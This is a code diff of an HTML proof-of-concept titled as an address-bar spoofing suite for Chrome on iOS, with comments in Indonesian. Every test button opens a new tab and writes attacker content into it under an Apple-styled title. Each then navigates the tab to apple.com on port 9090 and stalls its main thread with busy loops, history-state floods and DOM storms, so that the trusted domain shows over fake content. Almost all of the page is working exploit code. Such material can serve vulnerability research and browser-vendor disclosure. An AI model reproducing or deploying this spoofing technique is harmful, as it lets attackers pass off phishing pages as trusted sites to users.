@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Ultimate Address Bar Spoofing Suite - Zero</title>
+    <title>Force Port 9090 Persistent Spoofing Suite - Zero</title>
     <style>
       body, html {
         margin: 0;
@@ -34,7 +34,7 @@
       }
       button {
         width: 100%;
-        max-width: 380px;
+        max-width: 400px;
         padding: 18px 24px;
         font-size: 16px;
         font-weight: 600;
@@ -57,44 +57,37 @@
         background: #ff9500;
         box-shadow: 0 4px 16px rgba(255, 149, 0, 0.35);
       }
-      .btn-purple {
-        background: #af52de;
-        box-shadow: 0 4px 16px rgba(175, 82, 222, 0.35);
-      }
     </style>
   </head>
   <body>
     <div class="container">
-      <h1>Chrome iOS Address Bar Spoofing Suite</h1>
+      <h1>Port 9090 Force-Lock Suite</h1>
       
-      <!-- Test 1: Invalid Port Provisory Stalling -->
-      <button id="test1">Test 1: Invalid Port + Layout Flooding</button>
+      <!-- Test 1: Direct Port 9090 Injection & Stalling -->
+      <button id="test1">Test 1: Force apple.com:9090 Lock</button>
 
-      <!-- Test 2: Multi-Stage URL Redirect Hook -->
-      <button id="test2" class="btn-warning">Test 2: Multi-Stage Redirect Stalling</button>
+      <!-- Test 2: History State + Port 9090 Deadlock -->
+      <button id="test2" class="btn-warning">Test 2: History State + Port 9090</button>
 
-      <!-- Test 3: History State & DOM Mutation Storm -->
-      <button id="test3" class="btn-danger">Test 3: History State & Mutation Storm</button>
-
-      <!-- Test 4: Microtask & Shadow DOM Deadlock -->
-      <button id="test4" class="btn-purple">Test 4: Microtask & Shadow DOM Deadlock</button>
+      <!-- Test 3: Aggressive DOM Storm on Port 9090 -->
+      <button id="test3" class="btn-danger">Test 3: DOM Storm + Port 9090</button>
     </div>
 
     <script>
-      // Helper untuk injeksi awal konten penyerang (Attacker-Controlled Viewport)
+      // Helper untuk injeksi konten tampilan penyerang
       function injectAttackerContent(win) {
         if (!win) return;
         win.document.write(`
           <!DOCTYPE html>
           <html>
           <head>
-            <title>Apple - Official Site</title>
+            <title>Apple - Secure Enclave</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
           </head>
           <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
             <div>
-              <h1 style="font-size:38px;font-weight:700;color:#1d1d1f;margin:0 0 12px 0;">THIS IS NOT APPLE</h1>
-              <p style="font-size:20px;color:#ff3b30;margin:0;font-weight:600;">NAVIGATION PIPELINE DEADLOCK ACTIVE</p>
+              <h1 style="font-size:38px;font-weight:700;color:#1d1d1f;margin:0 0 12px 0;">PORT 9090 LOCKED</h1>
+              <p style="font-size:20px;color:#ff3b30;margin:0;font-weight:600;">RENDER PIPELINE DESYNCHRONIZED</p>
             </div>
           </body>
           </html>
@@ -103,72 +96,71 @@
         try { win.focus(); } catch (e) {}
       }
 
-      // --- TEST 1: Invalid Port + Layout Flooding ---
+      // --- TEST 1: Direct Port 9090 Injection & Stalling ---
       document.getElementById("test1").onclick = function () {
         const newTab = window.open("", "_blank");
         if (newTab) {
           injectAttackerContent(newTab);
+          
+          // Memicu navigasi langsung ke port 9090
           setTimeout(() => { 
             try {
-              // Memicu navigasi dengan Port Ilegal/Non-standar untuk membingungkan queue delegate
-              newTab.location.href = "https://apple.com:65535";
-            } catch(e) {
-              newTab.location.href = "https://apple.com";
-            }
+              newTab.location.href = "https://apple.com:9090";
+            } catch(e) {}
           }, 10);
+
+          // Mengunci main thread secara sinkronus untuk mempertahankan tampilan
           setTimeout(() => {
             try {
               newTab.eval(`
                 const start = Date.now();
-                while (Date.now() - start < 3000) {
+                while (Date.now() - start < 3500) {
                   const h = document.body.offsetHeight;
                   document.body.style.background = (h % 2 === 0) ? '#ffffff' : '#fafafa';
                 }
               `);
             } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 3000) {}
+              let s = Date.now(); while(Date.now() - s < 3500) {}
             }
-          }, 50);
+          }, 45);
         }
       };
 
-      // --- TEST 2: Multi-Stage Redirect Stalling ---
+      // --- TEST 2: History State + Port 9090 Deadlock ---
       document.getElementById("test2").onclick = function () {
         const newTab = window.open("", "_blank");
         if (newTab) {
           injectAttackerContent(newTab);
           setTimeout(() => {
             try {
-              newTab.location.href = "https://google.com";
-              setTimeout(() => {
-                newTab.location.href = "https://apple.com";
-              }, 4);
+              newTab.history.pushState({port: 9090}, "", "#secure-port");
+              newTab.location.href = "https://apple.com:9090";
             } catch (err) {}
           }, 10);
           setTimeout(() => {
             try {
               newTab.eval(`
                 const start = Date.now();
-                while (Date.now() - start < 3000) {
-                  const rects = document.body.getClientRects();
+                while (Date.now() - start < 3500) {
+                  history.pushState({rand: Math.random()}, "", "#flood");
+                  const d = document.body.offsetHeight;
                 }
               `);
             } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 3000) {}
+              let s = Date.now(); while(Date.now() - s < 3500) {}
             }
-          }, 45);
+          }, 50);
         }
       };
 
-      // --- TEST 3: History State & Mutation Storm ---
+      // --- TEST 3: Aggressive DOM Storm on Port 9090 ---
       document.getElementById("test3").onclick = function () {
         const newTab = window.open("", "_blank");
         if (newTab) {
           injectAttackerContent(newTab);
           setTimeout(() => {
             try {
-              newTab.history.pushState({spoof: true}, "", "#secure-enclave");
-              newTab.location.href = "https://apple.com";
+              newTab.location.href = "https://apple.com:9090";
             } catch (err) {}
           }, 10);
           setTimeout(() => {
@@ -176,45 +168,17 @@
               newTab.eval(`
                 const start = Date.now();
                 const body = document.body;
-                while (Date.now() - start < 3000) {
-                  history.pushState({rand: Math.random()}, "", "#flood");
-                  const el = document.createElement('span');
+                while (Date.now() - start < 4000) {
+                  const el = document.createElement('div');
+                  el.innerText = Math.random();
                   body.appendChild(el);
-                  if(body.childNodes.length > 70) body.innerHTML = "<h1>Locked State</h1>";
+                  if(body.childNodes.length > 60) body.innerHTML = "<h1>Locked Port 9090</h1>";
                 }
               `);
             } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 3000) {}
+              let s = Date.now(); while(Date.now() - s < 4000) {}
             }
-          }, 55);
-        }
-      };
-
-      // --- TEST 4: Microtask & Shadow DOM Deadlock ---
-      document.getElementById("test4").onclick = function () {
-        const newTab = window.open("", "_blank");
-        if (newTab) {
-          injectAttackerContent(newTab);
-          setTimeout(() => { newTab.location.href = "https://apple.com"; }, 12);
-          setTimeout(() => {
-            try {
-              newTab.eval(`
-                const host = document.createElement('div');
-                const shadow = host.attachShadow({mode: 'open'});
-                shadow.innerHTML = '<div>Deadlock</div>';
-                document.body.appendChild(host);
-                
-                const start = Date.now();
-                while (Date.now() - start < 3000) {
-                  Promise.resolve().then(() => {});
-                  const f = host.offsetHeight;
-                  shadow.host.style.width = (f % 2 === 0) ? '100px' : '101px';
-                }
-              `);
-            } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 3000) {}
-            }
-          }, 60);
+          }, 40);
         }
       };
     </script>
